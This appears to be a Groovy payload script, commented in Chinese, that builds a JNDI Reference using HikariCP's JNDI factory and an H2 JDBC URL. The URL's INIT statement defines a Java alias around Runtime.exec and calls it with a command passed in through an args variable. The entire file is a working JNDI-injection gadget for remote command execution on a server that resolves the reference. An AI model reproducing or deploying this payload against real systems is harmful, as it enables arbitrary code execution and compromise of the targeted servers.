import javax.naming.Reference
import javax.naming.StringRefAddr

def list = []
list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
list << "CALL EXEC('$args')" // 参数通过 args 变量传入

def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"

def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
ref.add(new StringRefAddr("jdbcUrl", url))

return ref // 返回 Reference 对象